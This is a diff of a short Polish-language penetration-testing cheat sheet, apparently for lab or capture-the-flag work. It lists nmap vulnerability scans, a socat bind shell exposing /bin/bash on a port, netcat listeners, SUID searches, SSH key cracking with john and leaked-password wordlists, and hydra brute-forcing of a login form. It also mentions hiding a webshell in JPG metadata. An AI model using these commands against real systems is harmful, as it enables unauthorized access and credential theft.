@@ -1,13 +1,16 @@
 
-nmap -Pn -sV --script "default or vuln" -p- -vv <IP>  → pełne skanowanie usług
-nc <IP> <port>  → połączenie z portem
+nmap -Pn -sV --script "default or vuln" -p- -vv <IP>  
+
+nc <IP> <port>  - połączenie
+nc -lvnp <PORT> - nasluch
 
 socat TCP-LISTEN:11111,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane 
 socat FILE:`tty`,raw,echo=0 TCP:<IP_SERWERA>:11111
 
 find / -perm -4000 -type f -exec ls -la {} + 2>/dev/null | sort
+find / -perm -4000 -type f 2>/dev/null
 
-ssh2john klucz > nowe
+ssh2john klucz > k.john
 john -w=/home/kali/Downloads/darkweb2017-top10000.txt k.john
 
 sudo su
@@ -21,7 +24,11 @@ echo 'user:pass' | chpasswd → zmiana hasła użytkownika
 ssh2john klucz > klucz.john
 john wordlista klucz.john
 
-Dirbuster/Gobuster → enumeracja katalogów i subdomen
+hydra:
+hydra -l <login> -P <wordlist> <protocol>://<IP>[:port]
+hydra -l admin -P rockyou.txt 10.10.10.5 http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
+
+
 Exiftool → modyfikacja metadanych (webshell w jpg)
-GTFOBins → baza metod eskalacji uprawnień
-SSH/SCP → zdalne połączenia i transfer plików
+
+
